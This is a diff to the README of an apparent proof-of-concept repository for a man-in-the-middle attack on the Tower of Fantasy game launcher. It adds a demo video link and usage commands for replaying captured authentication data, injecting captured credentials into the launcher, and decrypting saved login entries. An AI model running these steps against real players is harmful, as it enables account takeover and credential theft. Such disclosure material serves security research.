@@ -19,7 +19,7 @@ An attacker on the same network as a victim can perform a man-in-the-middle atta
 
 ## Demo video
 
-todo
+https://github.com/user-attachments/assets/dee54e39-a0a1-4763-ac74-f117e2650077
 
 ## Requirements
 
@@ -40,10 +40,20 @@ sudo python3 poc.py mitm -i eth0 -t <VICTIM_IP> -g <GATEWAY_IP>
 
 ### Decode a captured FlatBuffers blob
 ```
-python3 poc.py decode <HEX>
+python3 poc.py decode <CAPTURED_BLOB_HEX>
 ```
 
 ### Replay captured authentication data
 ```
-python3 poc.py auth <HEX>
+python3 poc.py auth <CAPTURED_BLOB_HEX>
+```
+
+### Inject captured credentials into the launcher (Windows)
+```
+.\inject.ps1 <CAPTURED_BLOB_HEX> <TOWER_OF_FANTASY_INSTALL_PATH>
+```
+
+### Decrypt saved login entries (Windows)
+```
+.\decrypt_player.ps1 <TOWER_OF_FANTASY_INSTALL_PATH>
 ```
